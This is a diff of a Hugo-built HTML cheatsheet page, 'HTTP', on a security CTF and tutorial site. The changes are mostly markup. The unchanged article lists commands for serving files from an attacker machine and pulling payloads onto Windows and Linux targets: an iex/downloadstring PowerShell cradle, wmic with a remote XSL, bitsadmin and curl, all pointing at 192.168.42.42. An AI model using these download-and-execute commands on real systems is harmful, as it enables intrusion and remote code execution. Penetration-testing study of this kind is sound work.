@@ -1,4 +1,4 @@
-<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>HTTP</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
+<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>HTTP | Ceso Adventures</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css><link rel=icon type=image/svg+xml href=https://ceso.github.io/images/site/logo.svg><link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/images/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/images/apple-touch-icon.png><link rel=mask-icon href=https://ceso.github.io/images/safari-pinned-tab.svg><meta name=theme-color content="#000000"></head><body><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
 |
 <a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
 |
@@ -39,7 +39,7 @@
 </a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
 </a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
 </a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
-</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>HTTP</h1></header><article><p>From your local attacker machine, create a http server with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>sudo python3 -m http.server 80
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr class=sidebar-divider><div class=sidebar-footer>I wuv cheese :D</div></nav><main><header class=page-title><h1>HTTP</h1></header><article><p>From your local attacker machine, create a http server with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>sudo python3 -m http.server 80
 </span></span><span style=display:flex><span>sudo python2 -m SimpleHTTPServer 80
 </span></span></code></pre></div><p>It&rsquo;s also possible to specify which path to share, for example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>sudo python3 -m http.server 80 --dir /home/kali/tools
 </span></span></code></pre></div><hr><h1 id=windows>Windows</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>iex(new-object net.webclient).downloadstring(&#34;http://192.168.42.42/evil.ps1)
@@ -48,15 +48,15 @@
 </span></span><span style=display:flex><span>wmic process get brief /format:&#34;http://192.168.42.42/evilexcel.xsl
 </span></span><span style=display:flex><span>bitsadmin /Transfer myDownload http://192.168.42.42/evilfile.txt C:\Windows\Temp\evilfile.txt
 </span></span></code></pre></div><hr><h1 id=linux>Linux</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>curl http://192.168.42.42/evil.php --output evil.php
-</span></span></code></pre></div><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
+</span></span></code></pre></div><hr></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank rel="noopener noreferrer">GitHub</a>
 |
-<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
+<a href=https://youtube.com/c/LeandroLemos target=_blank rel="noopener noreferrer">YouTube</a>
 |
-<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2026
+<a href=https://twitch.tv/0xc350 target=_blank rel="noopener noreferrer">Twitch</a></p><p class=copyright>Copyright © 2026
 <a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
-<a href=http://www.gohugo.io/>Hugo</a> by ceso,
+<a href=https://gohugo.io/>Hugo</a> by ceso,
 using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
 <a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
 <a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
 which was influenced by the theme
-<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>
+<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer></body></html>
